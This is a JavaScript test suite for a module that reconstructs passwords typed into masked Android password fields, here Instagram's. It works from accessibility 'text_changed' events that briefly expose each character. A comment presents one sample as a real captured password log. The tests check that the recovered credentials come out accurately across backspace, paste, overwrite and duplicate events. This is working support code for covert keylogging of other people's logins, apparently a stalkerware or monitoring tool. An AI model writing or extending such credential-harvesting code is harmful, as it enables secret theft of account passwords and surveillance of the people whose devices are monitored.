import { describe, it, expect } from 'vitest';
import { reconstructPassword, isMasked, pickBestSnapshot } from '../../public/js/password-reveal.js';

// Real capture from the activity console (chronological order):
// d → •a → ••e → •••i → ••••n → •••••l → ••••••1 → •••••••2 → ••••••••3 → •••••••••r → ••••••••••a → •••••••••••j
const TYPED_PASSWORD = ['d', 'a', 'e', 'i', 'n', 'l', '1', '2', '3', 'r', 'a', 'j'];
const SNAPSHOTS = TYPED_PASSWORD.map((ch, i) => '•'.repeat(i) + ch);

function snapEvents(snapshots, extra = {}) {
    return snapshots.map((text, i) => ({
        uuid: 'u' + i,
        type: 'text_changed',
        app: 'com.instagram.android',
        className: 'android.widget.EditText',
        isPassword: true,
        text: text,
        realText: text,
        beforeText: i > 0 ? snapshots[i - 1] : '',
        fromIndex: i,
        addedCount: 1,
        removedCount: 0,
        timestamp: 1700000000000 + i * 1000,
        ...extra,
    }));
}

describe('isMasked / pickBestSnapshot', () => {
    it('detects masked strings', () => {
        expect(isMasked('••••j')).toBe(true);
        expect(isMasked('d')).toBe(false);
        expect(isMasked('danielraj12')).toBe(false);
    });

    it('prefers an unmasked snapshot over a masked one', () => {
        const ev = { text: '••••j', realText: 'danielraj12' };
        expect(pickBestSnapshot(ev)).toBe('danielraj12');
    });

    it('prefers the snapshot with the longest visible tail when both are masked', () => {
        const ev = { text: '••••j', realText: '•••a' };
        expect(pickBestSnapshot(ev)).toBe('••••j');
    });
});

describe('reconstructPassword', () => {
    it('reconstructs a password typed from an empty field (the real log)', () => {
        const result = reconstructPassword(snapEvents(SNAPSHOTS));
        expect(result.text).toBe('daeinl123raj');
        expect(result.partial).toBe(false);
    });

    it('handles duplicate events per keystroke without inflating the result', () => {
        const events = [];
        SNAPSHOTS.forEach((snap, i) => {
            events.push(snapEvents([snap])[0]);
            events.push(snapEvents([snap])[0]); // text_selection duplicate
            events.push(snapEvents([snap])[0]); // content_change duplicate
        });
        const result = reconstructPassword(events);
        expect(result.text).toBe('daeinl123raj');
    });

    it('handles backspace', () => {
        // 'dae' then backspace twice → 'd'
        const snaps = ['d', '•a', '••e', '••', '•'];
        const result = reconstructPassword(snapEvents(snaps));
        expect(result.text).toBe('d');
    });

    it('handles select-all overwrite via removedCount', () => {
        // 'dae' then select-all + type 'x' → 'x'
        const events = snapEvents(['d', '•a', '••e', 'x']);
        events[3].removedCount = 3;
        const result = reconstructPassword(events);
        expect(result.text).toBe('x');
        expect(result.partial).toBe(true);
    });

    it('flags paste when snapshots jump several characters', () => {
        const events = snapEvents(['d', '•••••••x']);
        events[1].addedCount = 6;
        const result = reconstructPassword(events);
        expect(result.text).toBe('dx');
        expect(result.partial).toBe(true);
        expect(result.reason).toBe('paste');
    });

    it('flags a burst that starts mid-field', () => {
        const events = snapEvents(['•••n', '••••a']);
        const result = reconstructPassword(events);
        expect(result.text).toBe('na');
        expect(result.partial).toBe(true);
    });

    it('counts characters by code point (emoji-safe)', () => {
        // '😀' is 2 UTF-16 units but 1 character
        const events = snapEvents(['😀']);
        expect(events[0].text).toBe('😀');
        expect(isMasked('😀')).toBe(false); // not masked → authoritative
        const result = reconstructPassword(events);
        expect(result.text).toBe('😀');
        expect(result.partial).toBe(false);
    });

    it('returns the unmasked fast path (realText not masked)', () => {
        const events = snapEvents(['d', '•a', 'danielraj12']);
        const result = reconstructPassword(events);
        expect(result.text).toBe('danielraj12');
        expect(result.partial).toBe(false);
    });

    it('returns unrecoverable for fully-masked snapshots', () => {
        const events = snapEvents(['••••', '•••••']);
        const result = reconstructPassword(events);
        expect(result.partial).toBe(true);
    });

    it('handles replacement of the last character', () => {
        const events = snapEvents(['d', '•a', '•b']);
        const result = reconstructPassword(events);
        expect(result.text).toBe('db');
    });

    it('ignores non-text events and empty snapshots', () => {
        const events = [
            { type: 'click', text: 'Button' },
            { type: 'text_changed', text: 'd', realText: '', isPassword: true },
            { type: 'text_changed', text: '•a', realText: '•a', isPassword: true },
        ];
        const result = reconstructPassword(events);
        expect(result.text).toBe('da');
    });
});
